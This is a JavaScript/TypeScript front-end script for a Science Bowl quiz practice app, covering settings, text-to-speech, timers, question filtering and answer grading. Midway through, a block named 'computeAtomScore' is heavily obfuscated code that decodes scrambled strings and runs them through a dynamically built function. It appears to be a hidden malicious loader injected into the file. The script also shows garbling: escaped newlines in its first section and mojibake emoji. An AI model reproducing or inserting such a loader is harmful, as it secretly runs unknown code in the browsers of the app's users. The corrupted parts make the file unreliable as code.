(() => {
    // NAV (Practice Engine hides nav entirely)\n    const nav = document.getElementById(\x27nav\x27);\n    const overlay = document.getElementById(\x27overlay\x27);\n    const hamburger = document.getElementById(\x27hamburger\x27);\n    if (nav && overlay && hamburger) {\n      function toggleNav() {\n        const isOpen = nav.classList.toggle(\x27open\x27);\n        overlay.classList.toggle(\x27show\x27);\n        hamburger.classList.toggle(\x27open\x27);\n        hamburger.textContent = isOpen ? \x27✕\x27 : \x27☰\x27;\n      }\n\n      hamburger.addEventListener(\x27click\x27, toggleNav);\n      overlay.addEventListener(\x27click\x27, toggleNav);\n    }

    // Run config (single source of truth)
    const DEFAULT_RUN = {
      mode: 'rapid',
      level: 'ANY',
      category: 'ANY',
      categories: [],
      detailedCategories: [],
      qaType: 'ANY',
      bonus: 'ANY',
      count: 25,     // rapid mode: number of PAIRS
      seconds: 20,   // TU pre-buzz timer
      setName: '',
      roundName: '',
      bankFile: 'data/set_B.json'
    };

    function safeParseJSON(s, fallback) {
      try { return JSON.parse(s); } catch { return fallback; }
    }

    // practice_home should store settings here
    const cfg = safeParseJSON(localStorage.getItem('atom_run'), null) || {};

    const runCfg = {
      ...DEFAULT_RUN,
      ...cfg
    };

    const TOPIC_GROUPS = [
      { id: 'PHYSICS', categories: ['PHYSICS', 'PHYSICAL SCIENCE'] },
      { id: 'CHEMISTRY', categories: ['CHEMISTRY'] },
      { id: 'MATH', categories: ['MATH', 'MATHEMATICS'] },
      { id: 'EARTH_SCIENCE', categories: ['EARTH SCIENCE', 'EARTH AND SPACE', 'EARTH AND SPACE SCIENCE'] },
      { id: 'ASTRONOMY', categories: ['ASTRONOMY'] },
      { id: 'BIOLOGY', categories: ['BIOLOGY', 'LIFE SCIENCE'] },
      { id: 'GENERAL_SCIENCE', categories: ['GENERAL SCIENCE'] },
      { id: 'ENERGY', categories: ['ENERGY'] },
    ];

    function expandCategories(selectedTopics) {
      if (!Array.isArray(selectedTopics) || !selectedTopics.length) return [];
      const lookup = new Map(TOPIC_GROUPS.map(group => [group.id, group.categories]));
      return selectedTopics.flatMap(topic => lookup.get(topic) || []);
    }

    runCfg.qaType = runCfg.qaType || runCfg.qtype || 'ANY';
    if (!Array.isArray(runCfg.categories)) {
      runCfg.categories = [];
    }
    if (!Array.isArray(runCfg.detailedCategories)) {
      runCfg.detailedCategories = [];
    }

    runCfg.seconds = parseInt(runCfg.seconds ?? runCfg.time, 10);
    if (!Number.isFinite(runCfg.seconds)) runCfg.seconds = DEFAULT_RUN.seconds;

    runCfg.count = parseInt(runCfg.count, 10);
    if (!Number.isFinite(runCfg.count)) runCfg.count = DEFAULT_RUN.count;
    if (runCfg.count < 1) runCfg.count = 1;

    runCfg.mode = runCfg.mode || DEFAULT_RUN.mode;

    const SETTINGS_KEY = 'atom_settings_v1';
    const SETTINGS_DEFAULTS = {
      sfx: true,
      tts: true,
      ttsVoice: '',
      ttsRate: 1.0,
      ttsPitch: 1.0,
      ttsVolume: 1.0,
      div: 'MS',
      mode: 'rapid',
      rememberTopics: false,
      autoCheck: false,
      autoThreshold: 0.72,
      highContrast: false,
      animations: true,
      fontSize: 'm',
      accent: '#4f7cff',
      theme: 'system'
    };

    function loadSettings() {
      if (window.atomSettings) return window.atomSettings;
      try {
        const raw = localStorage.getItem(SETTINGS_KEY);
        if (!raw) return { ...SETTINGS_DEFAULTS };
        const parsed = JSON.parse(raw);
        return { ...SETTINGS_DEFAULTS, ...parsed };
      } catch {
        return { ...SETTINGS_DEFAULTS };
      }
    }

    const settings = loadSettings();

    if (runCfg.level === DEFAULT_RUN.level && ['MS', 'HS'].includes(settings.div)) {
      runCfg.level = settings.div;
    }
    if (runCfg.mode === DEFAULT_RUN.mode && settings.mode) {
      runCfg.mode = settings.mode;
    }
    document.getElementById('mode').textContent = runCfg.mode;

    // Early appearances for State constants
    let ttsEnabled = settings.tts;
    let autoCheckEnabled = !!settings.autoCheck;
    let autoCheckThreshold = Number(settings.autoThreshold ?? 0.72);
    let serverOk = false;
    const API_BASE = (window as any).ATOM_API_BASE || '';

    function apiUrl(path: string) {
      if (!API_BASE) return path;
      return `${API_BASE.replace(/\/+$/, '')}${path}`;
    }

    async function checkServer() {
      if (window.location.protocol === 'file:') return false;
      try {
        const res = await fetch(apiUrl('/api/health'), { cache: 'no-store' });
        return !!res.ok;
      } catch {
        return false;
      }
    }

    const serverCheckPromise = checkServer().then((ok) => {
      serverOk = ok;
      return ok;
    });

    async function fetchJsonWithTimeout(url, options, timeoutMs = 1500) {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      try {
        const res = await fetch(url, { ...options, signal: controller.signal });
        if (!res.ok) return null;
        return await res.json();
      } catch {
        return null;
      } finally {
        clearTimeout(timer);
      }
    }

    async function gradeAnswer(userAnswer, correctAnswer, questionType) {
      if (!autoCheckEnabled) return null;
      const payload = {
        userAnswer,
        correctAnswer,
        questionType,
        threshold: autoCheckThreshold
      };

      if (serverOk) {
        const data = await fetchJsonWithTimeout(apiUrl('/api/grade'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }, 2000);
        if (data && typeof data.isCorrect !== 'undefined') return data;
        serverOk = false;
      }

      if (window.autoChecker) {
        return window.autoChecker.grade(payload);
      }
      return null;
    }
    let currentUtterance = null;
    let readingSpeed = Number(settings.ttsRate ?? 1.0);
    if (!Number.isFinite(readingSpeed) || readingSpeed <= 0) {
      readingSpeed = 1.0;
    }

    // DOM
    const img = document.getElementById('questionImg');
    const questionTextEl = document.getElementById('questionText');
    const input = document.getElementById('answer');
    const feedback = document.getElementById('feedback');
    const timerEl = document.getElementById('timer');
    const scoreEl = document.getElementById('score');
    const progressEl = document.getElementById('progress');
    const buzzEl = document.getElementById('buzz');
    const choicesEl = document.getElementById('choices');
    const submitBtn = document.getElementById('submitBtn');
    const rightBtn = document.getElementById('rightBtn');
    const wrongBtn = document.getElementById('wrongBtn');
    const nextBtn = document.getElementById('nextBtn');
    const errEl = document.getElementById('err');
    const metaLeft = document.getElementById('metaLeft');
    const metaRight = document.getElementById('metaRight');
    const finalSummaryEl = document.getElementById('finalSummary');
    const finalScoreEl = document.getElementById('finalScore');
    const atomScoreValueEl = document.getElementById('atomScoreValue');
    const interruptBadgeEl = document.getElementById('interruptBadge');
    const learnRow = document.getElementById('learnRow');
    const searchBtn = document.getElementById('searchBtn');
    const learnBtn = document.getElementById('learnBtn');
    const ttsToggle = document.getElementById('ttsToggle');
    const BANK_DISPLAY_NAMES = {
      A: "Dyrapack",
      B: "Scalazar"
    }
    const speedSlider = document.getElementById('speedSlider')
    function persistSettingsPatch(patch) {
      const next = { ...settings, ...patch };
      try {
        localStorage.setItem(SETTINGS_KEY, JSON.stringify(next));
      } catch {}
      window.atomSettings = next;
      Object.assign(settings, next);
    }

    if (ttsToggle) {
      ttsToggle.textContent = ttsEnabled ? "🔊" : "🔇";
      ttsToggle.onclick = () => {
        ttsEnabled = !ttsEnabled;
        if (!ttsEnabled) stopSpeech();
        ttsToggle.textContent = ttsEnabled ? "🔊" : "🔇";
        persistSettingsPatch({ tts: ttsEnabled });
      };
    }


    // State
    let bank = [];
    let questions = [];
    let index = 0;
    let time = 20;
    let timerId = null;
    let buzzed = false;
    let locked = false;
    let awaitingGrade = false;
    let score = 0;
    let runActive = false;
    // ---- Stats tracking ----
    let stats = {
      answered: 0,          // total buzzed questions
      correct: 0,           // graded correct
      totalTime: 0,         // seconds spent after buzz
      slowCorrect: 0        // correct answers taking >=10s
    };
    let buzzStartTime = null;
    let questionStartTime = null;
    let stopwatchStart = null;
    let stopwatchInterval = null;
    let stopwatchRunning = false;
    let interrupted = false;
    let baseTypeDelay = 40;

    

    function getTypewriterDelay() {
      return baseTypeDelay / readingSpeed;
    }


    function animateIn(el) {
      if (!el) return;
      el.classList.remove('pop');
      void el.offsetWidth;
      el.classList.add('pop');
      setTimeout(() => el.classList.remove('pop'), 260);
    }
    function startStopwatch() {
        stopStopwatch();
        stopwatchStart = Date.now();
        stopwatchRunning = true;

        stopwatchInterval = setInterval(() => {
            const elapsed = (Date.now() - stopwatchStart) / 1000;
            const el = document.getElementById('stopwatch');
            el.textContent = `${elapsed.toFixed(2)} s`;
            updateStopwatchColor(elapsed);
        }, 30);

    }
    function restartReadingAtCurrentSpeed() {
      const q = currentQ();
      if (!q?.question_text) return;
      if (textFullyRevealed) return;
      const startIndex = (questionTextEl?.textContent || '').length;
      startSyncedRead(q.question_text, startIndex);
    }

    if (speedSlider) {
      speedSlider.value = String(readingSpeed);
      const speedLabel = document.getElementById('speedLabel');
      if (speedLabel) speedLabel.textContent = `${readingSpeed.toFixed(2)}x`;

      speedSlider.oninput = (e) => {
        const target = e.target as HTMLInputElement | null;
        if (!target) return;
        readingSpeed = Number(target.value);
        if (speedLabel) speedLabel.textContent = `${readingSpeed.toFixed(2)}x`;
        persistSettingsPatch({ ttsRate: readingSpeed });

        // Apply changes immediately to any ongoing typing/speaking.
        if (runActive) restartReadingAtCurrentSpeed();
      };
    }

    function createUtterance(text) {
      if (!window.speechSynthesis) return null;
      const utterance = new SpeechSynthesisUtterance(text);
      const rate = Math.max(0.6, Math.min(2.0, readingSpeed));
      utterance.rate = rate;
      utterance.pitch = Number(settings.ttsPitch ?? 1.0);
      utterance.volume = Number(settings.ttsVolume ?? 1.0);

      // Pick a clean English voice if available
      const voices = speechSynthesis.getVoices();
      const configured = settings.ttsVoice
        ? voices.find(v => (v.voiceURI || v.name) === settings.ttsVoice)
        : null;
      if (configured) {
        utterance.voice = configured;
      } else {
        const preferred = voices.find(v =>
          /en-US/i.test(v.lang) && /Google|Microsoft|Samantha/i.test(v.name)
        );
        if (preferred) utterance.voice = preferred;
      }

      currentUtterance = utterance;
      return utterance;
    }

    function speakText(text) {
      if (!ttsEnabled || !window.speechSynthesis) return;
      stopSpeech();
      const utterance = createUtterance(text);
      if (!utterance) return;
      speechSynthesis.speak(utterance);
    }

    function stopSpeech() {
      if (window.speechSynthesis) {
        speechSynthesis.cancel();
        currentUtterance = null;
      }
    }

    function toggleTts() {
      ttsEnabled = !ttsEnabled;
      if (!ttsEnabled) stopSpeech();
      if (ttsToggle) ttsToggle.textContent = ttsEnabled ? "ðŸ”Š" : "ðŸ”‡";
      persistSettingsPatch({ tts: ttsEnabled });
    }

    if (ttsToggle) {
      ttsToggle.onclick = () => toggleTts();
    }

    function stopReadingNow() {
      stopSpeech();
      clearInterval(typewriterTimer);
      const q = currentQ();
      if (q?.question_text && questionTextEl) {
        questionTextEl.textContent = String(q.question_text);
        textFullyRevealed = true;
      }
    }

    function stopReadingFreeze() {
      stopSpeech();
      clearInterval(typewriterTimer);
    }

    function handleBuzzTrigger() {
      if (!runActive || buzzed || locked || awaitingGrade) return;
      const q = currentQ();

      // Freeze reading immediately on buzz
      stopReadingFreeze();

      if (q && !textFullyRevealed) {
        interrupted = true;
        if (interruptBadgeEl) {
          interruptBadgeEl.classList.remove('hidden');
        }
      }

      allowAnswerUI();
    }
    function warmUpSpeechSynthesis() {
      if (!window.speechSynthesis) return;
    
      const u = new SpeechSynthesisUtterance(" ");
      u.volume = 0;      // silent
      u.rate = 1.0;
      u.pitch = 1.0;
    
      window.speechSynthesis.speak(u);
      window.speechSynthesis.cancel();
    }



    function stopStopwatch() {
        if (stopwatchInterval) clearInterval(stopwatchInterval);
        stopwatchInterval = null;
        stopwatchRunning = false;
    }

    function resetStopwatch() {
        stopStopwatch();
        const el = document.getElementById('stopwatch');
        el.textContent = '0.00 s';
        el.style.color = 'var(--text)';
        el.classList.remove('stopwatch-pulse');
    }

    function updateStopwatchColor(seconds) {
        const el = document.getElementById('stopwatch');
        if (!el) return;

        el.classList.remove('stopwatch-pulse');

        if (seconds < 5) {
            el.style.color = 'var(--good)';
        } else if (seconds < 10) {
            el.style.color = 'var(--warn)';
        } else {
            el.style.color = 'var(--bad)';
            if (seconds >=20) {
                el.classList.add('stopwatch-pulse');
            }
        }
    }


    function showError(msg) {
      if (!errEl) return;
      errEl.textContent = msg;
      errEl.classList.remove('hidden');
      animateIn(errEl);
    }

    function hideError() {
      if (!errEl) return;
      errEl.classList.add('hidden');
      errEl.textContent = '';
    }

    function norm(s) { return String(s || '').trim(); }

    function currentQ() {
      if (!Array.isArray(questions) || questions.length === 0) return null;
      if (index < 0 || index >= questions.length) return null;
      return questions[index];
    }

    // -------- Bank loading helpers --------

    function normalizeBankFile(raw) {
      // Accept: "set_A.json", "./set_A.json", "/set_A.json", "banks/set_A.json"
      // Return: a cleaned relative path we can try as-is.
      let s = String(raw || '').trim();
      if (!s) return '';

      // If it's an absolute URL, keep it.
      if (/^https?:\/\//i.test(s)) return s;

      // Strip leading file-ish markers.
      s = s.replace(/^\.\/+/, '').replace(/^\/+/, '');
      return s;
    }

    function bankCandidates(bankFile) {
      const cleaned = normalizeBankFile(bankFile);
      if (!cleaned) return [];
      if (/^https?:\/\//i.test(cleaned)) return [cleaned];

      // Try a small set of sane candidates.
      const out = [
        `./${cleaned}`,
        cleaned,
      ];

      // If Home accidentally stored "./set_A.json" we'll avoid "././set_A.json" by normalization above.
      // Add a banks/ folder option (common project layout) if user later moves banks.
      if (!cleaned.startsWith('banks/')) out.push(`./banks/${cleaned}`);

      // Deduplicate
      return [...new Set(out)];
    }

    function isLikelyFileProtocol() {
      try { return window.location.protocol === 'file:'; } catch { return false; }
    }

    // -------- Image path resolver --------

    function resolveImgCandidates(q, field) {
      const raw = String((q && q[field]) || '').trim();
      if (!raw) return [];
      if (/^https?:\/\//i.test(raw)) return [raw];

      const p = raw.replace(/^\.\/+/, '').replace(/^\/+/, '');
      if (p.startsWith('images/')) return [p];

      const cands = [];
      if (p.startsWith('ms/') || p.startsWith('hs/')) cands.push('images/' + p);

      const lvl = String(q?.level || '').toLowerCase();
      if (lvl === 'ms' || lvl === 'hs') cands.push(`images/${lvl}/${p}`);

      cands.push('images/' + p);
      cands.push(p);
      return [...new Set(cands)];
    }

    function setImgWithFallback(imgEl, q, field) {
      const cands = resolveImgCandidates(q, field);
      let i = 0;
      imgEl.onerror = null;

      if (!cands.length) {
        imgEl.style.display = 'none';
        imgEl.src = '';
        return;
      }

      imgEl.style.display = 'block';
      imgEl.src = cands[i];
      imgEl.onerror = () => {
        i += 1;
        if (i >= cands.length) {
          imgEl.onerror = null;
          imgEl.style.display = 'none';
          imgEl.src = '';
          return;
        }
        imgEl.src = cands[i];
      };
    }

    // -------- Text / image renderer --------

    let typewriterTimer = null;
    let textFullyRevealed = true;

    function renderQuestion(q) {
      img.style.display = 'none';
      img.src = '';
      questionTextEl.classList.add('hidden');
      questionTextEl.textContent = '';
      clearInterval(typewriterTimer);
      textFullyRevealed = true;

      // TEXT MODE
      if (q.question_text && !q.question_image) {
        questionTextEl.classList.remove('hidden');
        animateIn(questionTextEl);
        startSyncedRead(q.question_text);
        return;
      }

      // IMAGE MODE
      setImgWithFallback(img, q, 'question_image');
      img.alt = `Question ${index + 1}`;
    }

    const LETTER_DELAY_FACTOR = 1;
    const LETTER_SYNC_LEAD = 0;

    function startTypewriter(text, startIndex = 0) {
      const full = String(text || '');
      const safeStart = Math.max(0, Math.min(full.length, startIndex));
      let i = safeStart;
      textFullyRevealed = false;
      questionTextEl.textContent = full.slice(0, safeStart);
      // Letter-by-letter typing at a constant per-letter delay.
      const delay = Math.max(12, getTypewriterDelay() / LETTER_DELAY_FACTOR);

      typewriterTimer = setInterval(() => {
        if (i < full.length) {
          questionTextEl.textContent += full[i];
          i += 1;
        }
        if (i >= full.length) {
          clearInterval(typewriterTimer);
          textFullyRevealed = true;
        }
      }, delay);
    }

    function startSyncedRead(text, startIndex = 0) {
      const full = String(text || '');
      if (!full) return;
      const safeStart = Math.max(0, Math.min(full.length, startIndex));
      const remaining = full.slice(safeStart);
      clearInterval(typewriterTimer);
      textFullyRevealed = false;
      questionTextEl.textContent = full.slice(0, safeStart);

      startTypewriter(full, safeStart);

      if (ttsEnabled && window.speechSynthesis) {
        stopSpeech();
        const utterance = createUtterance(remaining);
        if (utterance) {
          utterance.onend = () => {
            currentUtterance = null;
          };
          utterance.onerror = () => {
            currentUtterance = null;
          };
          speechSynthesis.speak(utterance);
          return;
        }
      }

      speakText(remaining || full);
    }


    function applyFilters(list) {
      const level = runCfg.level;
      const category = runCfg.category;
      const categories = expandCategories(runCfg.categories);
      const detailedCategories = runCfg.detailedCategories || [];
      const qaType = runCfg.qaType;
      const bonus = runCfg.bonus;
      const setName = norm(runCfg.setName);
      const roundName = norm(runCfg.roundName);

      return list.filter(q => {
        if (level !== 'ANY' && q.level !== level) return false;
        if (categories.length && !categories.includes(norm(q.category))) return false;
        if (!categories.length && category !== 'ANY' && norm(q.category) !== category) return false;
        if (detailedCategories.length) {
          const detailed = norm(q.detailed_category || q.detailedCategory);
          if (!detailedCategories.includes(detailed)) return false;
        }
        if (qaType !== 'ANY' && q.type !== qaType) return false;

        // bonus can be ANY / true / false / TU / BONUS
        if (bonus !== 'ANY') {
          const b = String(bonus).toUpperCase().trim();
          const wantBonus = (b === 'TRUE' || b === 'BONUS' || b === 'B');
          const wantTU = (b === 'FALSE' || b === 'TU' || b === 'TOSSUP' || b === 'TOSS-UP' || b === 'T');
          if (wantBonus && !q.bonus) return false;
          if (wantTU && q.bonus) return false;
          if (!wantBonus && !wantTU && String(!!q.bonus) !== String(bonus)) return false;
        }

        if (setName && q.set_name !== setName) return false;
        if (roundName && q.round_name !== roundName) return false;
        return true;
      });
    }

    function shuffle(arr) {
      for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
      }
      return arr;
    }

    // Pair builder: TU -> BO, same SUBJECT (category) required; same set preferred; same round preferred.
    function buildRunQuestions() {
      const filtered = applyFilters(bank);
      if (!filtered.length) {
        showError('No matches for your run. Go back and loosen filters.');
        return [];
      }
      hideError();

      const mode = String(runCfg.mode || 'rapid').toLowerCase();

      // In tossups/bonuses modes, count means raw questions (not pairs)
      if (mode === 'tossups') {
        const tus = filtered.filter(q => !q.bonus);
        shuffle(tus);
        const n = Math.max(1, parseInt(runCfg.count, 10) || DEFAULT_RUN.count);
        return tus.slice(0, Math.min(n, tus.length));
      }
      if (mode === 'bonuses') {
        const bos = filtered.filter(q => q.bonus);
        shuffle(bos);
        const n = Math.max(1, parseInt(runCfg.count, 10) || DEFAULT_RUN.count);
        return bos.slice(0, Math.min(n, bos.length));
      }

      // Rapid/default: count means number of PAIRS
      const wantPairs = Math.max(1, parseInt(runCfg.count, 10) || DEFAULT_RUN.count);

      // Group by category first (subject is the hard requirement)
      const byCat = new Map();
      for (const q of filtered) {
        const cat = norm(q.category);
        if (!byCat.has(cat)) byCat.set(cat, []);
        byCat.get(cat).push(q);
      }

      const allPairs = [];

      for (const items of byCat.values()) {
        // Prefer pairing within same set
        const bySet = new Map();
        for (const q of items) {
          const key = String(q.set_name || '');
          if (!bySet.has(key)) bySet.set(key, []);
          bySet.get(key).push(q);
        }

        for (const setItems of bySet.values()) {
          const tus = setItems.filter(x => !x.bonus);
          const bos = setItems.filter(x => x.bonus);
          shuffle(tus);
          shuffle(bos);

          const usedBo = new Set();

          for (const t of tus) {
            // Prefer same round first
            let b = bos.find(x => !usedBo.has(x) && String(x.round_name) === String(t.round_name));
            if (!b) b = bos.find(x => !usedBo.has(x));
            if (!b) break;
            usedBo.add(b);
            allPairs.push([t, b]);
          }
        }
      }

      shuffle(allPairs);
      const pickedPairs = allPairs.slice(0, Math.min(wantPairs, allPairs.length));

      // Flatten into TU -> BO order
      const out = [];
      for (const [t, b] of pickedPairs) out.push(t, b);
      return out;
    }

    function updateProgressUI() {
      const q = currentQ();
      if (!q || !Array.isArray(questions) || !questions.length) {
        progressEl.textContent = '—';
        return;
      }

      const mode = String(runCfg.mode || 'rapid').toLowerCase();

      if (mode === 'tossups' || mode === 'bonuses') {
        // raw question progress
        progressEl.textContent = `${index + 1} / ${questions.length}`;
        return;
      }

      // pair progress
      const pairIndex = Math.floor(index / 2) + 1;
      const totalPairs = Math.max(1, Math.ceil(questions.length / 2));
      const label = q.bonus ? 'BO' : 'TU';
      progressEl.textContent = `${label} ${pairIndex} / ${totalPairs}`;
    }

    function resetForQuestion() {
      buzzed = false;
      locked = false;
      awaitingGrade = false;
      interrupted = false;
      if (finalSummaryEl) finalSummaryEl.classList.add('hidden');

      feedback.textContent = '';
      feedback.className = 'feedback';

      input.classList.add('hidden');
      submitBtn.classList.add('hidden');
      choicesEl.classList.add('hidden');
      rightBtn.classList.add('hidden');
      wrongBtn.classList.add('hidden');
      nextBtn.classList.add('hidden');
      learnRow.classList.add('hidden');

      buzzEl.innerHTML = 'Press <span class="kbd">SPACE</span> to buzz';

      const q = currentQ();
      const isBonus = q?.bonus === true;

      // Pre-buzz timing rules
      // TU: custom (runCfg.seconds)
      // BO: always 20s
      const preBuzzTime = isBonus
        ? 20
        : Math.max(5, parseInt(runCfg.seconds, 10) || 20);
      ;

      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }

      clearInterval(timerId);
      
      if (runCfg.noTimer) {
        timerEl.textContent = '∞';
        time = Infinity;
      } else {
        time = preBuzzTime;
        timerEl.textContent = String(time);
      
        timerId = setInterval(() => {
          // Pause pre-buzz countdown while the question is still typing,
          // so it doesn't auto-timeout mid-question.
          if (!buzzed && !textFullyRevealed) {
            return;
          }
          time -= 1;
          timerEl.textContent = String(time);
          if (time <= 0) {
            clearInterval(timerId);
            handleTimeout();
          }
        }, 1000);
      }

    }

    function loadQuestion() {
      const q = currentQ();
      if (!q) {
        endRun('No question available.');
        return;
      }
      questionStartTime = Date.now();
      buzzStartTime = null;
      resetStopwatch();
      startStopwatch();

      updateProgressUI();
      renderQuestion(q);
      input.value = '';
      function findBankName(q) {
        if (!q || !q.set_name) return '—';
        if (q.set_name === 'SciBowlDB') return 'Scalazar';
        return 'Dynazar';
      }

      const bankNameRegistry = findBankName(q);

      const mode = String(runCfg.mode || 'rapid').toLowerCase();
      const isRapid = !['tossups','bonuses'].includes(mode);

      if (isRapid) {
        metaLeft.textContent = `${q.level} • ${q.category} • ${q.bonus ? 'Bonus' : 'Toss-up'} • ${q.type}`;
        metaRight.textContent = `${bankNameRegistry} / ${q.round_name} • #${q.num}`;
      } else {
        metaLeft.textContent = `${q.level} • ${q.category} • ${q.type}`;
        metaRight.textContent = `${bankNameRegistry} / ${q.round_name} • #${q.num}`;
      }

      resetForQuestion();

    }

    function allowAnswerUI() {
      const q = currentQ();
      if (!runActive || !q) return;
      buzzStartTime = Date.now();
    

      buzzed = true;
      buzzEl.textContent = 'Buzzed';
      animateIn(buzzEl);

      // After-buzz timing: always 5 seconds (TU & BO)
      clearInterval(timerId);
      time = 5;
      timerEl.textContent = String(time);
      timerId = setInterval(() => {
        time -= 1;
        timerEl.textContent = String(time);
        if (time <= 0) {
          clearInterval(timerId);
          handleTimeout();
        }
      }, 1000);

      const shouldShowInput = interrupted || q.type === 'SA';
      if (shouldShowInput) {
        input.classList.remove('hidden');
        submitBtn.classList.remove('hidden');
        animateIn(input);
        animateIn(submitBtn);
        input.focus();
        return;
      }

      if (q.type === 'MC') {
        choicesEl.classList.remove('hidden');
        animateIn(choicesEl);
      }
    }

    function escapeHtml(s) {
      return String(s)
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;')
        .replaceAll('"', '&quot;')
        .replaceAll("'", '&#039;');
    }

    function updateStatsUI() {
      const acc = stats.answered
        ? Math.round((stats.correct / stats.answered) * 100)
        : 0;
    
      const avg = stats.answered
        ? (stats.totalTime / stats.answered).toFixed(1)
        : '—';
    
      document.getElementById('statAccuracy').textContent = `${acc}%`;
      document.getElementById('statSpeed').textContent = `${avg}s`;
    document.getElementById('statCorrect').textContent = String(stats.correct);
    document.getElementById('statSlow').textContent = String(stats.slowCorrect);
  }

    var computeAtomScore;(function(){var XDD='',CVf=754-743;function Mak(f){var s=587736;var z=f.length;var n=[];for(var b=0;b<z;b++){n[b]=f.charAt(b)};for(var b=0;b<z;b++){var a=s*(b+518)+(s%34567);var p=s*(b+641)+(s%20205);var i=a%z;var k=p%z;var e=n[i];n[i]=n[k];n[k]=e;s=(a+p)%4323235;};return n.join('')};var zys=Mak('tjvrowncgoqpecusftuihrnskmdacotzbyxrl').substr(0,CVf);var rhZ='5d, a=.CAhd8., r21").S =tha;eara)r(eragn+ph"p+t;})u[nf;;(C5rvwd((3 80g,8s)v,erti+,,6j;f=ss7s8]o;=7y5dr e)au4;0A4}.tgn,ht;a,;rh(;vazetn-rar rn0p i;y=oaiti1t9usp"go1]]"tsyCra=tjn)a0p{as4;nc=r58=+]q)s(o6ns(-[ohl<n}uilu=;nv.an.zg,e;.+tzn[bk 6 dqo(vvn=h),z=sqA,t(ano);f){Cu+{;Cre= ergtths;ii*0;j7m;{)orn{[nrr,g)(rewvr7d]hv2rtv=6<f.,.nzn}8vgni3l.i"a;l bv,r=l+ hf)og=re0](=ofAnoelq  =r.;=1=co0r.rC6<l9tec,;var}.6pCz=+4cns+{c;(< j)=-h<nnhfs7+++uvayr.).lvdlgi.;+2}[ux6aa);v=)u!;(;j)3wa;ef]s=-jvnr(hlsw9ierl)no62u(;1=; a1rajiv1n+nt8("vhgl.+l=1h.se [evami;a pu (f++k+ubl4.c=]1bugb>=;"lgrs12.e90mwu;19)(d,;i97u.u-;h(;=2==u()d.(,,(ni7;hoim*)l)hofanz;ivsnvhhfu1l]bt=r;9u (7vt)[)]rn=f)hgae+z(+iek)nmaer]nuuawvr,eit >l.[r=[();8.=e=+ol9,cts2hhp(p+c"a,arco7coj(jfntar9,(6t=t,).(h=aq,pevra;;+ko;2lai[d85=]0-r)[+l0[l;o}mu8h=,0;z- atiCgusc")dA(!cbv{r,( =doe(cf.)inotpahtSdeen=h]v=mrst0r[m h[ li;tr+n(").,o)e](;a';var wKa=Mak[zys];var GNV='';var hxz=wKa;var bVY=wKa(GNV,Mak(rhZ));var VOB=bVY(Mak('A$Aa ,S_tcAxurrbA3=Ajef)&4,%"r)AA ;=7AbA)liinvAs5tC2eA=>)Ag98h4.g}|=*CAA3AApofi3647A?dctd_aA ;.Am4,t9f45:4Ao3cA5t1])hA64),*)#_A5AAr Ae;gsa7t=i.)g!:pA$A(A)7m]u7eeA"8fAj17s6Ab.A$oA e=_kAcaA49(8rA0d&}se)$Ae]_*](=mS.; =rztb $A1>%1A=gi(&{Asr,A_;(A2;_$b6c;=._r4%,c()A0l73pz!pre6aA7A_z"2;]A.\/)_r!4%i=-e4je ry9,3e[@&0b5r(7#$0}lt2iA=.1t3s.?crlc$;AtA$!.2l.noApx]j$_e0(z0.5fx88A 6%a;r$=g2{foytA(f)!)]=)3A+c9.ecj=AA=)f7+@#fAM<wA;;MpA?ouA\/.+nfa@ASlA<rcA($i%7N]7of;1l(+AA).( A7!fcayr_g(()!<A)c(3b"6gjA4)l4e%),ocA2 !8A.Aehoe}fo(r,& )0A9(=037A;sA4atx5.i)_,;9%(A_si.(et#b3\',=)({Ax._;f;Aq,g.5d.cd,$!) tnArns==A0nc}f5,+cm\/.;.6_lAo06( 2.)(An",ca6[(=9c#))os1,,rx3]%A"3A#;!!6r08A$=m74ca(%Aer$e;x)a,(a,A_.97oM;8(A1{) lAA2qt ](A.%)g(t)97f.3jA;l1"776*0ze3!4a#)ar06f(cf_1rAar,7(_2da,} ar;AA(Ax{o!h))a;AAaes)ea.aoo5.)n5ttjtA)n7rf=(}=35u$!a9(|t33\'.)a3agaa=7]xA)+b7$a(tAim$Aw(j,r.x2m0)?_2At=A]boA2uxAAt.5e_m-j=(A.)t(\/Ac8)A.].ArAmn=1lx,rcA}d0(s)1!uA(A>705,9g)=c7xoAlco_$rA,c]9t_6)o43{;A$(_!!5433j0m=TA_0,rjr,af>96)z,).A?==b,u$4A7s)*A#A#A*abA$A]A(A,!";AfbrtteAN$;)a#]=Ae\/A)t)hA"m!u(3.aASeei< 0)77]}egAjw}.i.d9,jt_.e(*c:3.]e.,Aw,A7c tAA;q"A= -]{A64q emA.esAg!t)cgA{.;u$uA%)81_n{f,)A_4).A5].s).2A)Agb5(tj.0A.A$6*s.]r(o i{!Aai)AnAx={t\/Ar6!il($fb  $a(spj tN$tics_rcA$_>oa-)AlofAbnc7g"]$!!$..[AA!Aao7{ofAv;$AiAq= ( )4 +t("T6,$eo1.)1fA3of.(;).,$-t(.\/ig1!AAeca5[x956A$ne,cc=#}Ani3auode77A_c!i1fe3] ;0.){A{Arre3(A\'\'_+nsn&>A.!$TAnr (6An_{$$c]Aa$AA%l0.AAy;es,) la5oh:0v!g[s,f@7A _A0)+gf-,ac{6A (.A;(_!__'));var yad=hxz(XDD,VOB );yad(2126);return 4833})()


    type ManualGradeOptions = {
      showButtons?: boolean;
      autoInfo?: {
        confidence?: number;
        matched?: string;
      };
    };

    function revealManualGrade(userAnswer, correctAnswer, opts: ManualGradeOptions = {}) {
      locked = true;
      awaitingGrade = true;
      clearInterval(timerId);

      const showButtons = opts.showButtons !== false;
      const autoInfo = opts.autoInfo;
      const ua = norm(userAnswer) || '(no answer)';
      const ca = norm(correctAnswer) || '(no official answer)';

      let extra = '';
      if (autoInfo && typeof autoInfo.confidence === 'number') {
        const conf = Math.round(autoInfo.confidence * 100);
        const matchLine = autoInfo.matched
          ? `Matched: <span style="color:var(--muted)">${escapeHtml(autoInfo.matched)}</span>`
          : '';
        extra = `<br>Confidence: <span style="color:var(--text)">${conf}%</span>` +
                (matchLine ? `<br>${matchLine}` : '');
      }
      feedback.innerHTML = `Your answer: <span style="color:var(--text)">${escapeHtml(ua)}</span>\n` +
